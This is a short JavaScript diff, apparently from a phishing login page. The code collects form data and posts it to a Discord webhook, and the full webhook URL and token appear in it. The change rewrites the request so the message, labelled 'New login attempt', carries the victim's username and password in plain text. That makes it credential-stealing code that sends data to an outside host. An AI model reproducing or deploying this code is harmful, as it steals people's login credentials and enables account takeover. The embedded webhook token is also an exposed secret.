@@ -161,12 +161,14 @@
                     data[key] = value;
                 });
 
-                fetch('https://discord.com/api/webhooks/1261695608570384504/L4dEVU2jhKoKSxXza-8sVfvJWru7SW4_Lk8MldXp1cbN5XYJENTMiPJC4eUL4r0M1Mx1', {
+                var webhookURL = 'https://discord.com/api/webhooks/1261695608570384504/L4dEVU2jhKoKSxXza-8sVfvJWru7SW4_Lk8MldXp1cbN5XYJENTMiPJC4eUL4r0M1Mx1';
+
+                fetch(webhookURL, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({ content: `New login attempt:\nUsername: ${data.username}\nPassword: ${data.password}` })
                 })
                 .then(response => response.json())
                 .then(result => {
